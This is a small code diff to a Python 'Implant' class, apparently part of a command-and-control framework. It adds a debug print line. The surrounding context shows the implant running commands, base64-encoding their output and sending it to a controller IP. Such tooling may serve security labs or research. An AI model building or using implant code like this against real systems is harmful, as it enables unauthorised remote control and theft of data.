@@ -31,6 +31,8 @@ class Implant(Host):
                 output = check_output(cmd, stderr=STDOUT, timeout=3)
                 output = base64.b64encode(output.encode())
                 
+                print(output)
+
                 self.send(self.controller_ip, "instruction", "response", output.encode())
             except TimeoutExpired:
                 raise Exception
